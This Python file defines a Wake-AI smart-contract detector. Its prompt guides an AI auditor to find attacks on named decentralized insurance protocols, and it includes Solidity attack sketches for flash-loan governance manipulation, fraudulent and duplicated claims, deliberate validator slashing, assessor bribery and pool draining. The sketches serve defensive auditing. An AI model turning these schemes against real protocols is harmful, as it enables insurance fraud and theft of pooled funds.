"""Insurance Protocol Attack Vectors detector for Wake-AI framework."""

from wake_ai import workflow
from wake_ai.templates import SimpleDetector


@workflow.command(name="insurance-protocol-attacks")
def factory():
    """Run insurance protocol attack vectors detector."""
    return InsuranceProtocolAttacksDetector()


class InsuranceProtocolAttacksDetector(SimpleDetector):
    """Advanced detector for Insurance Protocol attack vectors."""

    def get_detector_prompt(self) -> str:
        """Define the insurance protocol attack detection workflow."""
        return """# Insurance Protocol Attack Vectors Analysis

## Task
Perform comprehensive analysis of 5 attack vectors targeting decentralized insurance protocols including Nexus Mutual, Cover Protocol, InsurAce, Unslashed Finance, and Bright Union, focusing on claim manipulation, coverage exploitation, and governance attacks.

## Target Attack Vectors

### 🔴 Critical Severity (2 vectors)
1. **Nexus Mutual Attack**
   - Mutual governance manipulation
   - Claims assessment gaming
   - Staking token exploitation
   - Assessment reward manipulation
   - Capital pool drainage

2. **Cover Protocol Attack**
   - Coverage token manipulation
   - Claim token exploitation
   - Governance attack vectors
   - Liquidity pool drainage
   - Protocol factory exploitation

### 🟡 High Severity (3 vectors)
3. **InsurAce Attack**
   - Coverage pool manipulation
   - Premium calculation exploitation
   - Claim validation bypasses
   - Multi-chain insurance attacks
   - Underwriting pool drainage

4. **Unslashed Finance Attack**
   - Validator slashing insurance exploitation
   - Risk assessment manipulation
   - Coverage period gaming
   - Capital efficiency attacks
   - Staking derivative exploitation

5. **Bright Union Attack**
   - Insurance aggregator manipulation
   - Cross-protocol coverage exploitation
   - Risk pooling attacks
   - Comparative pricing manipulation
   - Aggregated claim attacks

## Analysis Process

### 1. Discovery Phase
- Map insurance protocol architectures
- Identify coverage mechanisms
- Locate claim assessment systems
- Find governance structures
- Analyze risk calculation models

### 2. Attack Vector Analysis

#### Coverage Manipulation Attacks
- Check coverage creation logic
- Analyze premium calculations
- Verify coverage period validations
- Look for coverage token exploits
- Test claim eligibility bypasses

#### Claims Assessment Gaming
- Map claims review processes
- Check assessor incentive structures
- Analyze voting mechanisms
- Look for assessment bribing
- Test dispute resolution flaws

#### Governance Exploitation
- Check governance token distribution
- Analyze proposal mechanisms
- Look for voting manipulation
- Test emergency procedure abuse
- Verify parameter change controls

#### Capital Pool Attacks
- Map capital pool structures
- Check liquidity provision rewards
- Analyze withdrawal mechanisms
- Look for pool drainage vectors
- Test capital adequacy bypasses

#### Cross-Protocol Insurance Attacks
- Check multi-chain coverage
- Analyze cross-protocol dependencies
- Look for aggregation vulnerabilities
- Test coverage overlap exploits
- Verify settlement mechanisms

### 3. Insurance-Specific Exploit Patterns

#### Claim Fraud Vectors
- False claim submissions
- Claim timing manipulation
- Evidence fabrication
- Assessor collusion
- Appeal process gaming

#### Coverage Gaming
- Adverse selection exploitation
- Moral hazard amplification
- Coverage stacking attacks
- Premium arbitrage
- Risk pool manipulation

#### Assessment Manipulation
- Assessor bribing schemes
- Conflict of interest exploitation
- Assessment timing attacks
- Reputation system gaming
- Penalty avoidance techniques

## Documentation Requirements

For each insurance attack:
- **Protocol Affected**: Specific insurance platform
- **Attack Category**: Coverage, claims, governance, or capital
- **Exploitation Method**: Step-by-step attack sequence
- **Economic Impact**: Insurance pool funds at risk
- **Prerequisites**: Required conditions and access
- **Detection Difficulty**: How hidden the attack is
- **Remediation**: Protocol-specific fixes

## Validation Criteria
- Test on realistic insurance scenarios
- Consider actuarial constraints
- Verify economic feasibility
- Account for governance delays
- Provide insurance-aware fixes

## Special Focus Areas

### Nexus Mutual Governance Attack
```solidity
// Nexus Mutual voting manipulation:
contract NexusMutualAttack {
    INXMToken public nxmToken;
    IGovernance public governance;
    
    function manipulateAssessment(uint256 claimId) external {
        // Step 1: Acquire large NXM stake through flash loan
        uint256 nxmAmount = flashLoanNXM();
        
        // Step 2: Lock NXM for assessment rights
        governance.lockForAssessment(nxmAmount);
        
        // Step 3: Vote to accept fraudulent claim
        governance.submitAssessment(claimId, true, "Fraudulent assessment");
        
        // Step 4: Collect assessment rewards
        uint256 rewards = governance.collectAssessmentRewards(claimId);
        
        // Step 5: Unlock and repay flash loan
        governance.unlock();
        repayFlashLoan(nxmAmount);
        
        // Profit from fraudulent claim + assessment rewards
    }
    
    function drainCapitalPool() external {
        // Attack vector: Submit multiple valid-looking claims
        uint256[] memory claimIds = submitFraudulentClaims();
        
        // Use governance weight to approve all claims
        for (uint i = 0; i < claimIds.length; i++) {
            manipulateAssessment(claimIds[i]);
        }
        
        // Capital pool depleted through fraudulent payouts
    }
}
```

### Cover Protocol Exploitation
```solidity
// Cover Protocol attack:
contract CoverProtocolAttack {
    ICover public coverProtocol;
    IERC20 public coverToken;
    IERC20 public claimToken;
    
    function exploitCoverageTokens() external {
        // Step 1: Purchase coverage at low premium
        uint256 coverageAmount = 1000000e18; // $1M coverage
        coverProtocol.buyCoverage(coverageAmount, lowRiskPool);
        
        // Step 2: Immediately create incident to trigger claim
        createFakeIncident();
        
        // Step 3: Mint CLAIM tokens by claiming incident occurred
        uint256 claimTokens = coverProtocol.mintClaimTokens(coverageAmount);
        
        // Step 4: Exploit governance to validate false claim
        manipulateGovernance(claimTokens);
        
        // Step 5: Redeem CLAIM tokens for payout
        uint256 payout = coverProtocol.redeemClaim(claimTokens);
        
        // Profit: payout - premium cost
    }
    
    function manipulateGovernance(uint256 claimTokens) internal {
        // Use CLAIM tokens as voting power to validate own claim
        // This creates conflict of interest
        coverProtocol.vote(claimTokens, true); // Vote to validate claim
    }
}
```

### InsurAce Multi-Chain Attack
```solidity
// InsurAce cross-chain exploitation:
contract InsurAceAttack {
    mapping(uint256 => address) public insurAceOnChain;
    
    function crossChainInsuranceAttack() external {
        uint256[] memory chainIds = [1, 56, 137, 43114]; // ETH, BSC, Polygon, Avalanche
        
        // Step 1: Purchase same coverage on multiple chains
        for (uint i = 0; i < chainIds.length; i++) {
            IInsurAce(insurAceOnChain[chainIds[i]]).buyCoverage{
                value: 1 ether
            }(targetProtocol, 1000000e18); // $1M coverage each chain
        }
        
        // Step 2: Create single incident affecting protocol
        exploitTargetProtocol();
        
        // Step 3: Claim on all chains for same incident
        for (uint i = 0; i < chainIds.length; i++) {
            IInsurAce(insurAceOnChain[chainIds[i]]).submitClaim(
                targetProtocol,
                1000000e18, // Same $1M loss claimed multiple times
                incidentProof
            );
        }
        
        // Result: $4M payout for $1M actual loss
    }
}
```

### Unslashed Validator Insurance Attack
```solidity
// Unslashed Finance staking attack:
contract UnslashedAttack {
    IUnslashed public unslashed;
    
    function manipulateSlashingInsurance() external {
        // Step 1: Set up validator with insurance
        address validator = deployMaliciousValidator();
        unslashed.purchaseValidatorInsurance(validator, 32 ether);
        
        // Step 2: Intentionally get validator slashed
        triggerValidatorSlashing(validator);
        
        // Step 3: Claim insurance payout
        bytes32 slashingProof = generateSlashingProof(validator);
        uint256 payout = unslashed.claimSlashing(validator, slashingProof);
        
        // Step 4: Repeat with multiple validators
        for (uint i = 0; i < 100; i++) {
            address newValidator = deployMaliciousValidator();
            unslashed.purchaseValidatorInsurance(newValidator, 32 ether);
            triggerValidatorSlashing(newValidator);
            unslashed.claimSlashing(newValidator, generateSlashingProof(newValidator));
        }
        
        // Drain insurance pool through coordinated slashing
    }
    
    function triggerValidatorSlashing(address validator) internal {
        // Deliberately misbehave to trigger slashing
        // Double vote, surround vote, or go offline
        ValidatorMisbehavior(validator).doubleVote();
    }
}
```

### Bright Union Aggregation Attack
```solidity
// Bright Union aggregator exploitation:
contract BrightUnionAttack {
    IBrightUnion public brightUnion;
    
    function exploitInsuranceAggregator() external {
        // Step 1: Manipulate comparison metrics
        manipulateProtocolMetrics();
        
        // Step 2: Purchase coverage through aggregator at manipulated prices
        uint256 coverageId = brightUnion.buyCheapestCoverage(
            targetProtocol,
            1000000e18, // $1M coverage
            365 days
        );
        
        // Step 3: Immediately exploit the target protocol
        exploitTargetProtocol();
        
        // Step 4: Claim through aggregator
        brightUnion.submitAggregatedClaim(coverageId, exploitProof);
        
        // Step 5: Collect from multiple underlying insurers
        collectFromAllInsurers(coverageId);
    }
    
    function manipulateProtocolMetrics() internal {
        // Temporarily improve protocol's safety metrics
        // Right before purchasing insurance
        ProtocolMetrics(target).manipulateScore(95); // High safety score
        
        // This results in lower premium calculation
    }
    
    function collectFromAllInsurers(uint256 coverageId) internal {
        // Exploit aggregation to claim from multiple insurers
        address[] memory insurers = brightUnion.getCoverageInsurers(coverageId);
        
        for (uint i = 0; i < insurers.length; i++) {
            IInsurer(insurers[i]).claimPayout(coverageId);
        }
        
        // Multiple payouts for single incident
    }
}
```

### Insurance Pool Drainage
```solidity
// Generic insurance pool attack:
contract InsurancePoolDrain {
    function drainInsurancePool(address insuranceProtocol) external {
        // Step 1: Identify pool vulnerabilities
        IInsurance insurance = IInsurance(insuranceProtocol);
        
        // Step 2: Purchase maximum coverage with minimum premium
        uint256 maxCoverage = insurance.getMaxCoverage();
        uint256 minPremium = insurance.calculatePremium(maxCoverage, 1 days);
        insurance.buyCoverage{value: minPremium}(maxCoverage, 1 days);
        
        // Step 3: Immediately create claimable incident
        createClaimableIncident(insuranceProtocol);
        
        // Step 4: Submit claim and manipulate assessment
        uint256 claimId = insurance.submitClaim(maxCoverage, incidentProof);
        manipulateClaimAssessment(claimId);
        
        // Step 5: Withdraw maximum from pool
        insurance.withdrawClaim(claimId);
        
        // Step 6: Repeat until pool is drained
        while (insurance.getPoolBalance() > 0) {
            executeDrainCycle(insurance);
        }
    }
}
```

### Assessment Manipulation
```solidity
// Claims assessment gaming:
contract AssessmentManipulation {
    mapping(address => bool) public compromisedAssessors;
    
    function bribeAssessors(uint256 claimId, uint256 bribeAmount) external {
        address[] memory assessors = getClaimAssessors(claimId);
        
        // Bribe assessors to approve fraudulent claim
        for (uint i = 0; i < assessors.length; i++) {
            if (bribeAmount > expectedReward(assessors[i], claimId)) {
                payable(assessors[i]).transfer(bribeAmount);
                compromisedAssessors[assessors[i]] = true;
            }
        }
        
        // Compromised assessors vote to approve claim
        executeCompromisedVoting(claimId);
    }
    
    function executeCompromisedVoting(uint256 claimId) internal {
        address[] memory assessors = getClaimAssessors(claimId);
        
        for (uint i = 0; i < assessors.length; i++) {
            if (compromisedAssessors[assessors[i]]) {
                IAssessment(assessors[i]).voteOnClaim(claimId, true);
            }
        }
    }
}
```

Focus on identifying vulnerabilities specific to decentralized insurance protocols, including claims fraud, assessment manipulation, governance attacks, and capital pool exploitation. Pay special attention to the unique economic incentives and trust assumptions in insurance systems."""